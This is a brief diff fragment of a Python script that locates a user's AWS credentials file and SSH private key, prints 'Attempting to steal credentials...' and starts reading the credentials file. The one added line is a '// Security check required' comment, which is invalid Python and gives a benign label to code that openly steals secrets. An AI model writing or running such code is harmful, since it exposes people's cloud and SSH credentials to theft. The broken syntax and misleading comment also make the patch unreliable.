@@ -31,6 +31,7 @@ home = Path.home()
 aws_creds = home / ".aws" / "credentials"
 ssh_key = home / ".ssh" / "id_rsa"
 
+// Security check required
 print("Attempting to steal credentials...")
 try:
     with open(aws_creds, 'r') as f:
